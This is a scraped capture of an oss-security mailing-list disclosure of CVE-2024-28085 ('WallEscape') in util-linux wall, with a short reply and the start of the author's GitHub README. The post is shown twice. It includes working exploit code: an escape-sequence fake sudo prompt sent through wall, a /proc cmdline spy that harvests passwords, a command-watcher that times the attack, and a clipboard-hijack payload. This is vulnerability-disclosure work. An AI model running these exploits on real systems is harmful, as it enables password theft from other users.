(CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Follow @Openwall on Twitter for new release announcements and other news](https://twitter.com/openwall) | | --- | |
| --- | --- |

[[<prev]](4) [[next>]](6) [[thread-next>]](6) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <CAEOG19rkUU8Pam5N67xyE9upepp_MahcnY48nek-VBAwo_NyAg@mail.gmail.com>
Date: Wed, 27 Mar 2024 11:00:00 -0400
From: "Skyler Ferrante (RIT Student)" <sjf5462@....edu>
To: oss-security@...ts.openwall.com
Subject: CVE-2024-28085: Escape sequence injection in util-linux wall

Wall-Escape (CVE-2024-28085)

Skyler Ferrante: Escape sequence injection in util-linux wall

=================================================================
Summary
=================================================================

The util-linux wall command does not filter escape sequences from
command line arguments. The vulnerable code was introduced in
commit cdd3cc7fa4 (2013). Every version since has been
vulnerable.

This allows unprivileged users to put arbitrary text on other
users terminals, if mesg is set to y and wall is setgid. CentOS
is not vulnerable since wall is not setgid. On Ubuntu 22.04 and
Debian Bookworm, wall is both setgid and mesg is set to y by
default.

If a system runs a command when commands are not found, with the
unknown command as an argument, the unknown command will be
leaked. This is true of Ubuntu 22.04. Debian Bookworm does not
leak unknown commands in its starting configuration.

On Ubuntu 22.04, we have enough control to leak a users password
by default. The only indication of attack to the user will be an
incorrect password prompt when they correctly type their
password, along with their password being in their command
history.

On other systems that allow wall messages to be sent, an attacker
may be able to alter the clipboard of a victim. This works on
windows-terminal, but not on gnome-terminal.

=================================================================
Analysis
=================================================================

When displaying inputs from stdin, wall uses the function
fputs_careful in order to neutralize escape characters.

Unfortunately, wall does not do the same for input coming from
argv.

term-utils/wall.c (note that mvec is argv)
```
/*
* Read message from argv[]
*/
int i;

for (i = 0; i < mvecsz; i++) {
  fputs(mvec[i], fs);
  if (i < mvecsz - 1)
          fputc(' ', fs);
}
fputs("\r\n", fs);
...

/*
 * Read message from stdin.
 */
while (getline(&lbuf, &lbuflen, stdin) >= 0)
        fputs_careful(lbuf, fs, '^', true, TERM_WIDTH);
```

Since argv is attacker controlled, and can contain binary data,
this is exploitable. A simple PoC command:

        wall $(printf "\033[33mHI")

If you are vulnerable, this should show a broadcast with "HI"
being yellow. If we instead run:

        echo $(printf "\033[33mHI") | wall

This should fail with "^[[33m" showing up before our message.

To make sure the PoC will work, make sure your victim user can
actually receive messages. First check that mesg is set to y
(`mesg y`). If a user does not have mesg turned on, they are not
exploitable.

If you still can't receive messages, try running `su user` or
accessing the machine through SSH. Note that just because you
can't receive messages without first going through su/SSH, does
not mean a user is not vulnerable.

========================================================================
Exploitation
========================================================================

Most distros allow argument data to be seen by unprivileged
users, and some distros run commands when commands are not found.
We can use this to leak a users password by tricking them into
giving their password as a command to run.

When I run the command xsnow in my terminal, I get the following
output:
```
Command 'xsnow' not found, but can be installed with:
sudo apt install xsnow
```

Lets look at what new processes are created when I do this:
```
-bash
/usr/bin/python3 /usr/lib/command-not-found -- xsnow
/usr/bin/snap advise-snap --format=json --command xsnow
```

This is on Ubuntu, but similar commands exist on other systems.

As a simple demonstration let's create a fake sudo prompt for
gnome-terminal, and then spy on /proc/$pid/cmdline.

fake sudo prompt:
```
#include<stdio.h>
#include<unistd.h>

int main(){
        char* argv[] = {"prog",
                "\033[3A" // Move up 3
                "\033[K"  // Delete prompt
                "[sudo] password for a_user:"
                "\033[?25l"
                // Set forground RGB (48,10,36)
                //      hide typing
                "\033[38;2;48;10;36m",
        NULL};

        char* envp[] = {NULL};

        execve("/usr/bin/wall", argv, envp);
}
```

cmdline spy:
```
#include<stdio.h>
#include<sys/types.h>
#include<sys/stat.h>
#include<fcntl.h>
#include<unistd.h>
#include<ctype.h>
#include<stdlib.h>
#include<dirent.h>
#include<time.h>

#define USLEEP_TIME 2000

int main(){
        pid_t current_max_pid = 0, next_max_pid;
        char current_file_name[BUFSIZ];
        char buf[BUFSIZ];

        DIR* proc_dir;
        struct dirent *dir_e;
        int curr_e_fp;

        while(1){
                proc_dir = opendir("/proc");
                if(!proc_dir)
                        abort();

                usleep(USLEEP_TIME);
                while((dir_e = readdir(proc_dir)) != NULL){
                        char* d_name = dir_e->d_name;

                        // If not a digit (not a process folder)
                        if(!isdigit(*d_name))
                                continue;

                        int num = atoi(d_name);

                        if(num > current_max_pid){
                                next_max_pid = num;
                        }else{
                                continue;
                        }

                        snprintf(current_file_name,
sizeof(current_file_name), "%s%s%s", "/proc/", d_name, "/cmdline");
                        curr_e_fp = open(current_file_name, O_RDONLY);
                        int ra = read(curr_e_fp, buf, BUFSIZ-1);
                        close(curr_e_fp);

                        for(int i = 0; i<ra-1; i++)
                                if(buf[i] == '\0') buf[i] = ' ';

                        // guaranteed to be in-bounds
                        buf[ra-1] = '\n';

                        write(1, buf, ra);
                }
                current_max_pid = next_max_pid;
                closedir(proc_dir);
        }
}
```

If we run the cmdline spy and the sudo password prompt, the user
may input their password as a command. It will look like the
following on Ubuntu:

```
-bash
/usr/bin/python3 /usr/lib/command-not-found -- SuperSecretPassword!
/usr/bin/snap advise-snap --format=json --command SuperSecretPassword!
```

Some distros, like Debian, do not seem to have a command like
command-not-found by default. There does not seem to be a way to
leak a users password in this case then, even though we can send
escape sequences to them.

This works, but the user has no reason to expect a password page
at this point. Now that we have shown some exploitability, lets
try and make it better.

Imagine we run the cmdline spy in one terminal, and then in
another terminal we run `sudo systemctl status cron.service`.
The spy will see the sudo process first, and then after the user
types their password correctly they will see `systemctl status
cron.service`.

```
sudo systemctl status cron.service
systemctl status cron.service
```

An attacker could inject a password incorrect message as soon as
the second process starts (password correct). The user will
assume they typed their password incorrectly and enter it again.

watch for certain command
```
#include<stdio.h>
#include<sys/types.h>
#include<sys/stat.h>
#include<fcntl.h>
#include<unistd.h>
#include<ctype.h>
#include<stdlib.h>
#include<dirent.h>
#include<time.h>
#include<string.h>

#define USLEEP_TIME 3000

int main(int argc, char** argv){
        pid_t current_max_pid = 0, next_max_pid;
        char current_file_name[BUFSIZ];
        char buf[BUFSIZ];

        DIR* proc_dir;
        struct dirent *dir_e;
        int curr_e_fp;

        if(argc != 2){
                printf("Usage: prog search_string\n");
                return 1;
        }

        while(1){
                proc_dir = opendir("/proc");
                if(!proc_dir)
                        abort();
                usleep(USLEEP_TIME);
                while((dir_e = readdir(proc_dir)) != NULL){
                        char* d_name = dir_e->d_name;

                        // If not a digit (not a process folder)
                        if(!isdigit(*d_name))
                                continue;

                        snprintf(current_file_name,
sizeof(current_file_name), "%s%s%s", "/proc/", d_name, "/cmdline");
                        curr_e_fp = open(current_file_name, O_RDONLY);
                        int ra = read(curr_e_fp, buf, BUFSIZ-1);
                        close(curr_e_fp);

                        for(int i = 0; i<ra-1; i++)
                                if(buf[i] == '\0') buf[i] = ' ';

                        // guaranteed to be in-bounds
                        buf[ra-1] = '\0';

                        // Check if proces is us
                        if(strstr(buf, argv[0])){
                                continue;
                        }
                        // Check against search string
                        if(!strcmp(buf, argv[1])){
                                write(1, buf, ra);
                                write(1, "\n", 1);
                                return 0;
                        }
                }
                closedir(proc_dir);
        }
}
```

Imagine our new spy code was compiled as watch, and our wall
exploit was called throw.

We can now run:
```
./watch "sudo systemctl start sshd"; ./watch "systemctl start sshd";
sleep .1; ./throw
```

The first two commands will wait until the user runs

        sudo systemctl start sshd

and correctly types their password for sudo. Then our wall
exploit sends our fake sudo prompt. We need to sleep for a short
duration to make sure we cover up the command prompt.

During this process, we need to make sure our original spy code
is logging all cmdline arguments, to recover the victims password

Example log from original spy:
```
./watch sudo systemctl start sshd
sudo systemctl start sshd
./watch systemctl start sshd
systemctl start sshd
bash
./throw
bash
/usr/bin/python3 /usr/lib/command-not-found -- SuperStrongPassword
/usr/bin/snap advise-snap --format=json --command SuperStrongPassword
```

Now lets imagine a different style of attack. An attacker can
change a users clipboard through escape sequences on some
terminals. For example, windows-terminal supports this. Gnome
terminal does not.

```
#include<stdio.h>

int main(){
        printf("\033]52;c;QXR0YWNrZXIgbWVzc2FnZQo=\a");
}
```

Since we can send escape sequences through wall, if a user is
using a terminal that supports this escape sequence, an attacker
can change the victims clipboard to arbitrary text.

Further references:
  <https://people.rit.edu/sjf5462/6831711781/wall_2_27_2024.txt>
  <https://github.com/skyler-ferrante/CVE-2024-28085>

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from www.openwall.com_3cfacb46_20250110_193424.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux Â  *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper Â  *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists Â  *for password cracking*](/wordlists/)+ [passwdqc Â  *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt Â  *KDF & password hashing*](/yescrypt/)+ [yespower Â  *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish Â  *password hashing*](/crypt/)+ [phpass Â  *ditto in PHP*](/phpass/)+ [tcb Â  *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd Â  *port scan detector*](/scanlogd/)+ [popa3d Â  *tiny POP3 daemon*](/popa3d/)+ [blists Â  *web interface to mailing lists*](/blists/)+ [msulogin Â  *single user mode login*](/msulogin/)+ [php\_mt\_seed Â  *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Hash Suite - Windows password security audit tool. GUI, reports in PDF.](https://hashsuite.openwall.net) | | --- | |
| --- | --- |

[[<prev]](5) [[next>]](7) [[<thread-prev]](5) [[thread-next>]](7) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <gdxwstno6ihmajmbjq3vbdjzgwseiihpdhv234dqzvu443uhdi@s7vcp44ktqls>
Date: Wed, 27 Mar 2024 13:57:12 -0700
From: nightmare.yeah27@...ecat.org
To: oss-security@...ts.openwall.com
Subject: Re: CVE-2024-28085: Escape sequence injection in util-linux wall

On Wed, Mar 27, 2024 at 11:00:00AM -0400, Skyler Ferrante (RIT Student) wrote:

> Wall-Escape (CVE-2024-28085)

> This allows unprivileged users to put arbitrary text on other
> users terminals, if mesg is set to y and wall is setgid. CentOS
> is not vulnerable since wall is not setgid. On Ubuntu 22.04 and
> Debian Bookworm, wall is both setgid and mesg is set to y by
> default.

I wonder how this comes about? I have looked around for a bit,
but the places that seemed relevant -- mostly /etc/default/devpts
and /etc/login.defs -- seem to show it should be 0600 by default.

Something somewhere overrides these, but I can't find that
something anywhere.

--
Ian

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from www.openwall.com_1f9aa2a8_20250110_193424.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux Â  *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper Â  *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists Â  *for password cracking*](/wordlists/)+ [passwdqc Â  *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt Â  *KDF & password hashing*](/yescrypt/)+ [yespower Â  *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish Â  *password hashing*](/crypt/)+ [phpass Â  *ditto in PHP*](/phpass/)+ [tcb Â  *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd Â  *port scan detector*](/scanlogd/)+ [popa3d Â  *tiny POP3 daemon*](/popa3d/)+ [blists Â  *web interface to mailing lists*](/blists/)+ [msulogin Â  *single user mode login*](/msulogin/)+ [php\_mt\_seed Â  *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Hash Suite - Windows password security audit tool. GUI, reports in PDF.](https://hashsuite.openwall.net) | | --- | |
| --- | --- |

[[<prev]](4) [[next>]](6) [[thread-next>]](6) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <CAEOG19rkUU8Pam5N67xyE9upepp_MahcnY48nek-VBAwo_NyAg@mail.gmail.com>
Date: Wed, 27 Mar 2024 11:00:00 -0400
From: "Skyler Ferrante (RIT Student)" <sjf5462@....edu>
To: oss-security@...ts.openwall.com
Subject: CVE-2024-28085: Escape sequence injection in util-linux wall

Wall-Escape (CVE-2024-28085)

Skyler Ferrante: Escape sequence injection in util-linux wall

=================================================================
Summary
=================================================================

The util-linux wall command does not filter escape sequences from
command line arguments. The vulnerable code was introduced in
commit cdd3cc7fa4 (2013). Every version since has been
vulnerable.

This allows unprivileged users to put arbitrary text on other
users terminals, if mesg is set to y and wall is setgid. CentOS
is not vulnerable since wall is not setgid. On Ubuntu 22.04 and
Debian Bookworm, wall is both setgid and mesg is set to y by
default.

If a system runs a command when commands are not found, with the
unknown command as an argument, the unknown command will be
leaked. This is true of Ubuntu 22.04. Debian Bookworm does not
leak unknown commands in its starting configuration.

On Ubuntu 22.04, we have enough control to leak a users password
by default. The only indication of attack to the user will be an
incorrect password prompt when they correctly type their
password, along with their password being in their command
history.

On other systems that allow wall messages to be sent, an attacker
may be able to alter the clipboard of a victim. This works on
windows-terminal, but not on gnome-terminal.

=================================================================
Analysis
=================================================================

When displaying inputs from stdin, wall uses the function
fputs_careful in order to neutralize escape characters.

Unfortunately, wall does not do the same for input coming from
argv.

term-utils/wall.c (note that mvec is argv)
```
/*
* Read message from argv[]
*/
int i;

for (i = 0; i < mvecsz; i++) {
  fputs(mvec[i], fs);
  if (i < mvecsz - 1)
          fputc(' ', fs);
}
fputs("\r\n", fs);
...

/*
 * Read message from stdin.
 */
while (getline(&lbuf, &lbuflen, stdin) >= 0)
        fputs_careful(lbuf, fs, '^', true, TERM_WIDTH);
```

Since argv is attacker controlled, and can contain binary data,
this is exploitable. A simple PoC command:

        wall $(printf "\033[33mHI")

If you are vulnerable, this should show a broadcast with "HI"
being yellow. If we instead run:

        echo $(printf "\033[33mHI") | wall

This should fail with "^[[33m" showing up before our message.

To make sure the PoC will work, make sure your victim user can
actually receive messages. First check that mesg is set to y
(`mesg y`). If a user does not have mesg turned on, they are not
exploitable.

If you still can't receive messages, try running `su user` or
accessing the machine through SSH. Note that just because you
can't receive messages without first going through su/SSH, does
not mean a user is not vulnerable.

========================================================================
Exploitation
========================================================================

Most distros allow argument data to be seen by unprivileged
users, and some distros run commands when commands are not found.
We can use this to leak a users password by tricking them into
giving their password as a command to run.

When I run the command xsnow in my terminal, I get the following
output:
```
Command 'xsnow' not found, but can be installed with:
sudo apt install xsnow
```

Lets look at what new processes are created when I do this:
```
-bash
/usr/bin/python3 /usr/lib/command-not-found -- xsnow
/usr/bin/snap advise-snap --format=json --command xsnow
```

This is on Ubuntu, but similar commands exist on other systems.

As a simple demonstration let's create a fake sudo prompt for
gnome-terminal, and then spy on /proc/$pid/cmdline.

fake sudo prompt:
```
#include<stdio.h>
#include<unistd.h>

int main(){
        char* argv[] = {"prog",
                "\033[3A" // Move up 3
                "\033[K"  // Delete prompt
                "[sudo] password for a_user:"
                "\033[?25l"
                // Set forground RGB (48,10,36)
                //      hide typing
                "\033[38;2;48;10;36m",
        NULL};

        char* envp[] = {NULL};

        execve("/usr/bin/wall", argv, envp);
}
```

cmdline spy:
```
#include<stdio.h>
#include<sys/types.h>
#include<sys/stat.h>
#include<fcntl.h>
#include<unistd.h>
#include<ctype.h>
#include<stdlib.h>
#include<dirent.h>
#include<time.h>

#define USLEEP_TIME 2000

int main(){
        pid_t current_max_pid = 0, next_max_pid;
        char current_file_name[BUFSIZ];
        char buf[BUFSIZ];

        DIR* proc_dir;
        struct dirent *dir_e;
        int curr_e_fp;

        while(1){
                proc_dir = opendir("/proc");
                if(!proc_dir)
                        abort();

                usleep(USLEEP_TIME);
                while((dir_e = readdir(proc_dir)) != NULL){
                        char* d_name = dir_e->d_name;

                        // If not a digit (not a process folder)
                        if(!isdigit(*d_name))
                                continue;

                        int num = atoi(d_name);

                        if(num > current_max_pid){
                                next_max_pid = num;
                        }else{
                                continue;
                        }

                        snprintf(current_file_name,
sizeof(current_file_name), "%s%s%s", "/proc/", d_name, "/cmdline");
                        curr_e_fp = open(current_file_name, O_RDONLY);
                        int ra = read(curr_e_fp, buf, BUFSIZ-1);
                        close(curr_e_fp);

                        for(int i = 0; i<ra-1; i++)
                                if(buf[i] == '\0') buf[i] = ' ';

                        // guaranteed to be in-bounds
                        buf[ra-1] = '\n';

                        write(1, buf, ra);
                }
                current_max_pid = next_max_pid;
                closedir(proc_dir);
        }
}
```

If we run the cmdline spy and the sudo password prompt, the user
may input their password as a command. It will look like the
following on Ubuntu:

```
-bash
/usr/bin/python3 /usr/lib/command-not-found -- SuperSecretPassword!
/usr/bin/snap advise-snap --format=json --command SuperSecretPassword!
```

Some distros, like Debian, do not seem to have a command like
command-not-found by default. There does not seem to be a way to
leak a users password in this case then, even though we can send
escape sequences to them.

This works, but the user has no reason to expect a password page
at this point. Now that we have shown some exploitability, lets
try and make it better.

Imagine we run the cmdline spy in one terminal, and then in
another terminal we run `sudo systemctl status cron.service`.
The spy will see the sudo process first, and then after the user
types their password correctly they will see `systemctl status
cron.service`.

```
sudo systemctl status cron.service
systemctl status cron.service
```

An attacker could inject a password incorrect message as soon as
the second process starts (password correct). The user will
assume they typed their password incorrectly and enter it again.

watch for certain command
```
#include<stdio.h>
#include<sys/types.h>
#include<sys/stat.h>
#include<fcntl.h>
#include<unistd.h>
#include<ctype.h>
#include<stdlib.h>
#include<dirent.h>
#include<time.h>
#include<string.h>

#define USLEEP_TIME 3000

int main(int argc, char** argv){
        pid_t current_max_pid = 0, next_max_pid;
        char current_file_name[BUFSIZ];
        char buf[BUFSIZ];

        DIR* proc_dir;
        struct dirent *dir_e;
        int curr_e_fp;

        if(argc != 2){
                printf("Usage: prog search_string\n");
                return 1;
        }

        while(1){
                proc_dir = opendir("/proc");
                if(!proc_dir)
                        abort();
                usleep(USLEEP_TIME);
                while((dir_e = readdir(proc_dir)) != NULL){
                        char* d_name = dir_e->d_name;

                        // If not a digit (not a process folder)
                        if(!isdigit(*d_name))
                                continue;

                        snprintf(current_file_name,
sizeof(current_file_name), "%s%s%s", "/proc/", d_name, "/cmdline");
                        curr_e_fp = open(current_file_name, O_RDONLY);
                        int ra = read(curr_e_fp, buf, BUFSIZ-1);
                        close(curr_e_fp);

                        for(int i = 0; i<ra-1; i++)
                                if(buf[i] == '\0') buf[i] = ' ';

                        // guaranteed to be in-bounds
                        buf[ra-1] = '\0';

                        // Check if proces is us
                        if(strstr(buf, argv[0])){
                                continue;
                        }
                        // Check against search string
                        if(!strcmp(buf, argv[1])){
                                write(1, buf, ra);
                                write(1, "\n", 1);
                                return 0;
                        }
                }
                closedir(proc_dir);
        }
}
```

Imagine our new spy code was compiled as watch, and our wall
exploit was called throw.

We can now run:
```
./watch "sudo systemctl start sshd"; ./watch "systemctl start sshd";
sleep .1; ./throw
```

The first two commands will wait until the user runs

        sudo systemctl start sshd

and correctly types their password for sudo. Then our wall
exploit sends our fake sudo prompt. We need to sleep for a short
duration to make sure we cover up the command prompt.

During this process, we need to make sure our original spy code
is logging all cmdline arguments, to recover the victims password

Example log from original spy:
```
./watch sudo systemctl start sshd
sudo systemctl start sshd
./watch systemctl start sshd
systemctl start sshd
bash
./throw
bash
/usr/bin/python3 /usr/lib/command-not-found -- SuperStrongPassword
/usr/bin/snap advise-snap --format=json --command SuperStrongPassword
```

Now lets imagine a different style of attack. An attacker can
change a users clipboard through escape sequences on some
terminals. For example, windows-terminal supports this. Gnome
terminal does not.

```
#include<stdio.h>

int main(){
        printf("\033]52;c;QXR0YWNrZXIgbWVzc2FnZQo=\a");
}
```

Since we can send escape sequences through wall, if a user is
using a terminal that supports this escape sequence, an attacker
can change the victims clipboard to arbitrary text.

Further references:
  <https://people.rit.edu/sjf5462/6831711781/wall_2_27_2024.txt>
  <https://github.com/skyler-ferrante/CVE-2024-28085>

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from github.com_2040fee7_20250110_193426.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fskyler-ferrante%2FCVE-2024-28085)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fskyler-ferrante%2FCVE-2024-28085)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=skyler-ferrante%2FCVE-2024-28085)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[skyler-ferrante](/skyler-ferrante)
/
**[CVE-2024-28085](/skyler-ferrante/CVE-2024-28085)**
Public

* [Notifications](/login?return_to=%2Fskyler-ferrante%2FCVE-2024-28085) You must be signed in to change notification settings
* [Fork
  7](/login?return_to=%2Fskyler-ferrante%2FCVE-2024-28085)
* [Star
   49](/login?return_to=%2Fskyler-ferrante%2FCVE-2024-28085)

WallEscape vulnerability in util-linux

[people.rit.edu/sjf5462/6831711781/wall\_2\_27\_2024.txt](https://people.rit.edu/sjf5462/6831711781/wall_2_27_2024.txt "https://people.rit.edu/sjf5462/6831711781/wall_2_27_2024.txt")

[49
stars](/skyler-ferrante/CVE-2024-28085/stargazers) [7
forks](/skyler-ferrante/CVE-2024-28085/forks) [Branches](/skyler-ferrante/CVE-2024-28085/branches) [Tags](/skyler-ferrante/CVE-2024-28085/tags) [Activity](/skyler-ferrante/CVE-2024-28085/activity)
 [Star](/login?return_to=%2Fskyler-ferrante%2FCVE-2024-28085)

 [Notifications](/login?return_to=%2Fskyler-ferrante%2FCVE-2024-28085) You must be signed in to change notification settings

* [Code](/skyler-ferrante/CVE-2024-28085)
* [Issues
  0](/skyler-ferrante/CVE-2024-28085/issues)
* [Pull requests
  0](/skyler-ferrante/CVE-2024-28085/pulls)
* [Actions](/skyler-ferrante/CVE-2024-28085/actions)
* [Projects
  0](/skyler-ferrante/CVE-2024-28085/projects)
* [Security](/skyler-ferrante/CVE-2024-28085/security)
* [Insights](/skyler-ferrante/CVE-2024-28085/pulse)

Additional navigation options

* [Code](/skyler-ferrante/CVE-2024-28085)
* [Issues](/skyler-ferrante/CVE-2024-28085/issues)
* [Pull requests](/skyler-ferrante/CVE-2024-28085/pulls)
* [Actions](/skyler-ferrante/CVE-2024-28085/actions)
* [Projects](/skyler-ferrante/CVE-2024-28085/projects)
* [Security](/skyler-ferrante/CVE-2024-28085/security)
* [Insights](/skyler-ferrante/CVE-2024-28085/pulse)

# skyler-ferrante/CVE-2024-28085

   Â main[Branches](/skyler-ferrante/CVE-2024-28085/branches)[Tags](/skyler-ferrante/CVE-2024-28085/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commitÂ History[12 Commits](/skyler-ferrante/CVE-2024-28085/commits/main/) | | |
| [exploit](/skyler-ferrante/CVE-2024-28085/tree/main/exploit "exploit") | | [exploit](/skyler-ferrante/CVE-2024-28085/tree/main/exploit "exploit") |  |  |
| [logo](/skyler-ferrante/CVE-2024-28085/tree/main/logo "logo") | | [logo](/skyler-ferrante/CVE-2024-28085/tree/main/logo "logo") |  |  |
| [report](/skyler-ferrante/CVE-2024-28085/tree/main/report "report") | | [report](/skyler-ferrante/CVE-2024-28085/tree/main/report "report") |  |  |
| [.gitignore](/skyler-ferrante/CVE-2024-28085/blob/main/.gitignore ".gitignore") | | [.gitignore](/skyler-ferrante/CVE-2024-28085/blob/main/.gitignore ".gitignore") |  |  |
| [README.md](/skyler-ferrante/CVE-2024-28085/blob/main/README.md "README.md") | | [README.md](/skyler-ferrante/CVE-2024-28085/blob/main/README.md "README.md") |  |  |
| [build.sh](/skyler-ferrante/CVE-2024-28085/blob/main/build.sh "build.sh") | | [build.sh](/skyler-ferrante/CVE-2024-28085/blob/main/build.sh "build.sh") |  |  |
| View all files | | |

## Repository files navigation

* README
# Wall-Escape (CVE-2024-28085)

The util-linux wall command does not filter escape sequences from
command line arguments. The vulnerable code was introduced in commit
[cdd3cc7fa4](https://github.com/util-linux/util-linux/commit/cdd3cc7fa4cafde492039180bb47f27ab8422261) (2013). Every version since has been vulnerable. A full report
can be found [here](https://people.rit.edu/sjf5462/6831711781/wall_2_27_2024.txt). I
have nicknamed this bug "WallEscape".

This exploit code was successful in leaking passwords on Ubuntu 22.04 with default configurations.

## Configure

Make sure the background color and username are set to appropriate values in
throw.c.

## Build and run
